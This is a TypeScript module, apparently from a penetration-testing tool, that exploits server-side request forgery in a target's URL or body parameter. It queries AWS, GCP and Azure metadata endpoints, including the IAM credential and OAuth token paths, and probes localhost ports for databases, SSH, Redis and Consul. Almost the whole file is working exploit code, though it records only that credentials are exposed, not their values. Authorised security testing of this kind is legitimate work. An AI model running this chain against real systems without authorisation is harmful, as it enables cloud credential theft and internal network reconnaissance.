/**
 * SSRF Post-Exploitation Module
 * 
 * Proves internal network access and cloud metadata exposure via SSRF.
 * Focuses on cloud credential extraction and internal service discovery.
 */

import { createHash } from "crypto";
import { ValidatingHttpClient, type ValidationContext } from "../../validation/validating-http-client";

export interface SsrfExploitConfig {
  targetUrl: string;
  parameterName: string;
  parameterLocation: "url_param" | "body_param";
  httpMethod: "GET" | "POST";
  headers?: Record<string, string>;
}

export interface CloudMetadataResult {
  provider: "aws" | "azure" | "gcp" | "unknown";
  accessible: boolean;
  instanceId?: string;
  region?: string;
  credentialsExposed?: boolean;
  roleArn?: string;
  subscriptionId?: string;
  projectId?: string;
  metadata: Record<string, string>;
}

export interface InternalServiceProbe {
  url: string;
  accessible: boolean;
  responseCode?: number;
  service?: string;
  responseSnippet?: string;
}

export interface SsrfPostExploitResult {
  success: boolean;
  cloudMetadata?: CloudMetadataResult;
  internalServices: InternalServiceProbe[];
  localhostAccess: boolean;
  evidence: string;
  proofArtifacts: ProofArtifact[];
  executionTimeMs: number;
}

interface ProofArtifact {
  type: string;
  description: string;
  data: string;
  hash: string;
  capturedAt: Date;
}

const CLOUD_METADATA_ENDPOINTS = {
  aws: {
    base: "http://169.254.169.254",
    paths: [
      "/latest/meta-data/instance-id",
      "/latest/meta-data/local-hostname",
      "/latest/meta-data/iam/security-credentials/",
      "/latest/dynamic/instance-identity/document",
    ],
    credPath: "/latest/meta-data/iam/security-credentials/",
  },
  azure: {
    base: "http://169.254.169.254",
    paths: [
      "/metadata/instance?api-version=2021-02-01",
      "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    headers: { "Metadata": "true" },
  },
  gcp: {
    base: "http://metadata.google.internal",
    paths: [
      "/computeMetadata/v1/instance/id",
      "/computeMetadata/v1/instance/hostname",
      "/computeMetadata/v1/project/project-id",
      "/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    headers: { "Metadata-Flavor": "Google" },
  },
};

const INTERNAL_SERVICE_CHECKS = [
  { url: "http://localhost:80", service: "HTTP" },
  { url: "http://localhost:8080", service: "HTTP Proxy" },
  { url: "http://localhost:3000", service: "Node.js App" },
  { url: "http://127.0.0.1:22", service: "SSH" },
  { url: "http://127.0.0.1:3306", service: "MySQL" },
  { url: "http://127.0.0.1:5432", service: "PostgreSQL" },
  { url: "http://127.0.0.1:6379", service: "Redis" },
  { url: "http://127.0.0.1:27017", service: "MongoDB" },
  { url: "http://127.0.0.1:9200", service: "Elasticsearch" },
  { url: "http://127.0.0.1:8500", service: "Consul" },
];

export class SsrfPostExploitModule {
  private httpClient: ValidatingHttpClient;
  private context?: ValidationContext;
  
  constructor(context?: ValidationContext) {
    this.httpClient = new ValidatingHttpClient({ timeout: 10000 });
    this.context = context;
  }
  
  async probeCloudMetadata(config: SsrfExploitConfig): Promise<CloudMetadataResult | null> {
    // Try AWS first
    const awsResult = await this.probeAwsMetadata(config);
    if (awsResult?.accessible) return awsResult;
    
    // Try GCP
    const gcpResult = await this.probeGcpMetadata(config);
    if (gcpResult?.accessible) return gcpResult;
    
    // Try Azure
    const azureResult = await this.probeAzureMetadata(config);
    if (azureResult?.accessible) return azureResult;
    
    return null;
  }
  
  private async probeAwsMetadata(config: SsrfExploitConfig): Promise<CloudMetadataResult | null> {
    const metadata: Record<string, string> = {};
    let accessible = false;
    
    const instanceIdUrl = `${CLOUD_METADATA_ENDPOINTS.aws.base}/latest/meta-data/instance-id`;
    const instanceResult = await this.makeSSRFRequest(config, instanceIdUrl);
    
    if (instanceResult.accessible && instanceResult.response) {
      accessible = true;
      metadata["instance-id"] = instanceResult.response.substring(0, 50);
    }
    
    if (!accessible) return null;
    
    const identityUrl = `${CLOUD_METADATA_ENDPOINTS.aws.base}/latest/dynamic/instance-identity/document`;
    const identityResult = await this.makeSSRFRequest(config, identityUrl);
    
    let region: string | undefined;
    if (identityResult.accessible && identityResult.response) {
      try {
        const doc = JSON.parse(identityResult.response);
        region = doc.region;
        metadata["region"] = region || "";
        metadata["accountId"] = doc.accountId?.toString() || "";
      } catch {}
    }
    
    const roleUrl = `${CLOUD_METADATA_ENDPOINTS.aws.base}/latest/meta-data/iam/security-credentials/`;
    const roleResult = await this.makeSSRFRequest(config, roleUrl);
    
    let credentialsExposed = false;
    let roleArn: string | undefined;
    
    if (roleResult.accessible && roleResult.response) {
      roleArn = roleResult.response.trim().split("\n")[0];
      metadata["iam-role"] = roleArn;
      
      const credUrl = `${CLOUD_METADATA_ENDPOINTS.aws.base}/latest/meta-data/iam/security-credentials/${roleArn}`;
      const credResult = await this.makeSSRFRequest(config, credUrl);
      
      if (credResult.accessible && credResult.response?.includes("AccessKeyId")) {
        credentialsExposed = true;
        metadata["credentials-exposed"] = "true";
      }
    }
    
    return {
      provider: "aws",
      accessible,
      instanceId: metadata["instance-id"],
      region,
      credentialsExposed,
      roleArn,
      metadata,
    };
  }
  
  private async probeGcpMetadata(config: SsrfExploitConfig): Promise<CloudMetadataResult | null> {
    const metadata: Record<string, string> = {};
    
    const instanceIdUrl = `${CLOUD_METADATA_ENDPOINTS.gcp.base}/computeMetadata/v1/instance/id`;
    const instanceResult = await this.makeSSRFRequest(config, instanceIdUrl, { "Metadata-Flavor": "Google" });
    
    if (!instanceResult.accessible) return null;
    
    metadata["instance-id"] = instanceResult.response?.substring(0, 50) || "";
    
    const projectUrl = `${CLOUD_METADATA_ENDPOINTS.gcp.base}/computeMetadata/v1/project/project-id`;
    const projectResult = await this.makeSSRFRequest(config, projectUrl, { "Metadata-Flavor": "Google" });
    
    if (projectResult.accessible && projectResult.response) {
      metadata["project-id"] = projectResult.response.trim();
    }
    
    const tokenUrl = `${CLOUD_METADATA_ENDPOINTS.gcp.base}/computeMetadata/v1/instance/service-accounts/default/token`;
    const tokenResult = await this.makeSSRFRequest(config, tokenUrl, { "Metadata-Flavor": "Google" });
    
    const credentialsExposed = tokenResult.accessible && tokenResult.response?.includes("access_token");
    if (credentialsExposed) {
      metadata["credentials-exposed"] = "true";
    }
    
    return {
      provider: "gcp",
      accessible: true,
      instanceId: metadata["instance-id"],
      projectId: metadata["project-id"],
      credentialsExposed,
      metadata,
    };
  }
  
  private async probeAzureMetadata(config: SsrfExploitConfig): Promise<CloudMetadataResult | null> {
    const metadata: Record<string, string> = {};
    
    const metadataUrl = `${CLOUD_METADATA_ENDPOINTS.azure.base}/metadata/instance?api-version=2021-02-01`;
    const result = await this.makeSSRFRequest(config, metadataUrl, { "Metadata": "true" });
    
    if (!result.accessible) return null;
    
    try {
      const doc = JSON.parse(result.response || "{}");
      metadata["vmId"] = doc.compute?.vmId || "";
      metadata["location"] = doc.compute?.location || "";
      metadata["subscriptionId"] = doc.compute?.subscriptionId || "";
    } catch {}
    
    const tokenUrl = `${CLOUD_METADATA_ENDPOINTS.azure.base}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`;
    const tokenResult = await this.makeSSRFRequest(config, tokenUrl, { "Metadata": "true" });
    
    const credentialsExposed = tokenResult.accessible && tokenResult.response?.includes("access_token");
    if (credentialsExposed) {
      metadata["credentials-exposed"] = "true";
    }
    
    return {
      provider: "azure",
      accessible: true,
      instanceId: metadata["vmId"],
      region: metadata["location"],
      subscriptionId: metadata["subscriptionId"],
      credentialsExposed,
      metadata,
    };
  }
  
  async probeInternalServices(
    config: SsrfExploitConfig,
    options: { maxProbes?: number; customUrls?: string[] } = {}
  ): Promise<InternalServiceProbe[]> {
    const results: InternalServiceProbe[] = [];
    const targets = options.customUrls 
      ? options.customUrls.map(url => ({ url, service: "Custom" }))
      : INTERNAL_SERVICE_CHECKS;
    
    const maxProbes = options.maxProbes || 10;
    
    for (const target of targets.slice(0, maxProbes)) {
      const result = await this.makeSSRFRequest(config, target.url);
      
      results.push({
        url: target.url,
        accessible: result.accessible,
        responseCode: result.statusCode,
        service: target.service,
        responseSnippet: result.response?.substring(0, 100),
      });
    }
    
    return results;
  }
  
  async checkLocalhostAccess(config: SsrfExploitConfig): Promise<boolean> {
    const result = await this.makeSSRFRequest(config, "http://127.0.0.1/");
    return result.accessible;
  }
  
  async runFullExploitation(
    config: SsrfExploitConfig,
    options: {
      skipCloudMetadata?: boolean;
      skipInternalProbe?: boolean;
      maxProbes?: number;
    } = {}
  ): Promise<SsrfPostExploitResult> {
    const startTime = Date.now();
    const proofArtifacts: ProofArtifact[] = [];
    const evidence: string[] = [];
    
    // Step 1: Cloud Metadata
    let cloudMetadata: CloudMetadataResult | undefined;
    if (!options.skipCloudMetadata) {
      cloudMetadata = (await this.probeCloudMetadata(config)) || undefined;
      
      if (cloudMetadata?.accessible) {
        evidence.push(`Cloud: ${cloudMetadata.provider.toUpperCase()} metadata accessible`);
        
        if (cloudMetadata.credentialsExposed) {
          evidence.push("CRITICAL: Cloud credentials exposed via SSRF");
        }
        
        proofArtifacts.push({
          type: "cloud_metadata",
          description: `${cloudMetadata.provider.toUpperCase()} metadata access`,
          data: JSON.stringify({
            provider: cloudMetadata.provider,
            instanceId: cloudMetadata.instanceId,
            region: cloudMetadata.region,
            credentialsExposed: cloudMetadata.credentialsExposed,
          }),
          hash: createHash("sha256").update(JSON.stringify(cloudMetadata)).digest("hex"),
          capturedAt: new Date(),
        });
      }
    }
    
    // Step 2: Localhost Access Check
    const localhostAccess = await this.checkLocalhostAccess(config);
    if (localhostAccess) {
      evidence.push("Localhost accessible via SSRF");
      proofArtifacts.push({
        type: "localhost_access",
        description: "Localhost/127.0.0.1 accessible",
        data: "http://127.0.0.1/ returned successful response",
        hash: createHash("sha256").update("localhost_accessible").digest("hex"),
        capturedAt: new Date(),
      });
    }
    
    // Step 3: Internal Service Probing
    let internalServices: InternalServiceProbe[] = [];
    if (!options.skipInternalProbe) {
      internalServices = await this.probeInternalServices(config, {
        maxProbes: options.maxProbes || 10,
      });
      
      const accessibleServices = internalServices.filter(s => s.accessible);
      if (accessibleServices.length > 0) {
        evidence.push(`${accessibleServices.length} internal services accessible`);
        
        for (const service of accessibleServices) {
          proofArtifacts.push({
            type: "internal_service",
            description: `${service.service} at ${service.url}`,
            data: service.responseSnippet || "accessible",
            hash: createHash("sha256").update(service.url).digest("hex"),
            capturedAt: new Date(),
          });
        }
      }
    }
    
    const success = !!(cloudMetadata?.accessible || localhostAccess || internalServices.some(s => s.accessible));
    
    return {
      success,
      cloudMetadata,
      internalServices,
      localhostAccess,
      evidence: evidence.join("; "),
      proofArtifacts,
      executionTimeMs: Date.now() - startTime,
    };
  }
  
  // ---------------------------------------------------------------------------
  // Private Helpers
  // ---------------------------------------------------------------------------
  
  private async makeSSRFRequest(
    config: SsrfExploitConfig,
    targetUrl: string,
    additionalHeaders?: Record<string, string>
  ): Promise<{ accessible: boolean; statusCode?: number; response?: string }> {
    const url = new URL(config.targetUrl);
    let requestUrl = url.toString();
    let body: string | undefined;
    const headers: Record<string, string> = { ...config.headers, ...additionalHeaders };
    
    if (config.parameterLocation === "url_param") {
      url.searchParams.set(config.parameterName, targetUrl);
      requestUrl = url.toString();
    } else {
      body = `${config.parameterName}=${encodeURIComponent(targetUrl)}`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
    }
    
    try {
      const { response } = await this.httpClient.request({
        method: config.httpMethod,
        url: requestUrl,
        headers,
        body,
      }, this.context);
      
      const accessible = response.statusCode >= 200 && response.statusCode < 400;
      
      return {
        accessible,
        statusCode: response.statusCode,
        response: accessible ? response.body : undefined,
      };
    } catch {
      return { accessible: false };
    }
  }
}
